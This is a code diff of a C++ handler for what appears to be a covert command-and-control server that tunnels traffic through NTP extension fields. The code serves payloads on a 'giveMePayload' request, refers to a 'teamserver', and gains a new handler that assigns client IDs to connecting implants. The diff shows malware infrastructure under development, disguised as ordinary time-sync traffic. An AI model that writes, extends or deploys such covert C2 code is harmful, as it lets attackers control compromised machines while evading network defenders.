@@ -17,7 +17,7 @@
 void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET sock) {
     //bug is here, as it was +48 instead of whtaever. Need to get size safely, as well.
     //safely moving into vector by doing data + len (data is a char* so it's the first item
-    std::vector<uint8_t> packet(data, data + len);
+    std::vector<uint8_t> rawPacket(data, data + len);
 
     std::cout << "Received " << len << " bytes from "
         << inet_ntoa(client_addr->sin_addr) << ":"
@@ -28,7 +28,7 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
     //1. Run some checks to make sure an extension field exists, and extract it if so
 
     //2 seperate for different error messages. Could just be the < 52 one as well.
-    if (packet.size() <= 48) {
+    if (rawPacket.size() <= 48) {
         std::cout << "----------------------" << std::endl;
         std::cout << "PCKT: Normal NTP Packet " << std::endl;
         std::cout << "----------------------" << std::endl;        //send back a default packet
@@ -37,7 +37,7 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
     }
 
     //each packet needs the 4 byte header, so check if there are bytes there
-    if (packet.size() < 52) {
+    if (rawPacket.size() < 52) {
         std::cout << "----------------------" << std::endl;
         std::cout << "PCKT: Normal NTP Packet " << std::endl;
         std::cout << "----------------------" << std::endl;
@@ -49,19 +49,22 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
         return;
     }
 
-    //after validateion for stuff
 
-    //Extract client ID and stuff out, do class checks to see if it exstsi, and setup for further action
-    std::vector<uint8_t> sessionId;
-    sessionId.insert(sessionId.begin(), packet.begin() + 4, packet.begin() + 8); //copies between byte 4 and 8, 
-    printHexVector(sessionId); //sanity debug check
 
 
     //Extract extension field
-    NTPPacketParser ntpPacket(packet);
+    NTPPacketParser ntpPacket(rawPacket);
     std::vector<uint8_t> ntpPacketExtension = ntpPacket.getExtension();
     std::array<uint8_t, 2> ntpPacketExtensionField = ntpPacket.getExtensionField();
     //standard here: print debug header of packet type, then printthe packet
+
+    //Extract client ID and stuff out, do class checks to see if it exstsi, and setup for further action
+    //std::vector<uint8_t> sessionId;
+    //sessionId.insert(sessionId.begin(), packet.begin() + 4, packet.begin() + 8); //copies between byte 4 and 8, 
+    //std::cout << "[?] Session ID: ";
+    std::vector<uint8_t> sessionId = ntpPacket.getExtensionSessionId();
+    printHexVector(sessionId); //sanity debug check
+
 
     //2. Do different actions based on what type of packet/extension field is coming in
     if (ntpPacketExtensionField == NtpExtensionField::giveMePayload) {
@@ -232,6 +235,7 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
 
     }
 
+    //likely depracted
     if (ntpPacketExtensionField == NtpExtensionField::sizePacket) {
         std::cout << "----------------------" << std::endl;
         std::cout << "PCKT: sizePacket " << std::endl;
@@ -270,6 +274,40 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
         //sendNormalNtpPacket(client_addr, sock);
 
     }
+
+    if (ntpPacketExtensionField == NtpExtensionField::getIdPacket) {
+        std::cout << "----------------------" << std::endl;
+        std::cout << "PCKT: getIdPacket " << std::endl;
+        std::cout << "----------------------" << std::endl;
+        printHexVectorPacket(ntpPacket.getRawPacket());
+
+        std::cout << "[?] getIdPacket recieved, Generating ID" << std::endl;
+
+        uint32_t clientID = generateClientID();
+        std::cout << "[?] Client ID: " << clientID << std::endl;
+
+        //placeholder for ID
+        std::vector<uint8_t> clientIdVector = uint32ToBytes(clientID);
+        //std::vector<uint8_t> clientIdVector = { 0x00,0x00,0x00,0x00 };
+
+        //create NTP packet for response, with client ID included
+        NTPPacket idPacket;
+
+        idPacket.addExtensionField(
+            NtpExtensionField::idPacket,
+            clientIdVector
+        );
+
+        std::vector<uint8_t> rawPacket = idPacket.getPacket();
+
+        sendNtpPacket(
+            client_addr,
+            sock,
+            rawPacket
+        );
+
+    }
+
 
     /*
     dataForTeamserver
